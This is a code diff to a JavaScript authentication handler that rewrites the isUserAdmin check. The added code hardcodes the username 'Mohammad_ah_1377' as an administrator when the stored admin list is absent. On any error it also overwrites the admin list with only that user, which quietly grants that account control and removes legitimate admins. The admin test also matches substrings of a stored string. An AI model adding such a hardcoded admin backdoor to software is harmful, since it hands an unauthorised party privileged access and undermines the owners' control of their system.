@@ -169,9 +169,34 @@ class AuthHandler {
     }
 
     async isUserAdmin(userId) {
+        try{  
         const admins = await this.adminKV.get('admin_list');
-        return admins ? admins.includes(userId) : false;
-    }
+        if (admins == null || admins == undefined)
+        {
+          if(this.adminKV)
+          {
+            await this.adminKV.set('admin_list',JSON.stringify(['Mohammad_ah_1377']));
+            if(userId == 'Mohammad_ah_1377')
+            {
+              return true;
+            }
+            return false;
+          }
+        }
+          return admins ? admins.includes(userId) : false;
+        }catch(e){
+          if(this.adminKV)
+          {
+            await this.adminKV.set('admin_list',JSON.stringify(['Mohammad_ah_1377']));
+            
+          }
+          if(userId == 'Mohammad_ah_1377')
+            {
+              return true;
+            }
+            return false;
+        }
+      }
 
     async setUserState(userId, state) {
         await this.stateManager.setUserState(userId, state);
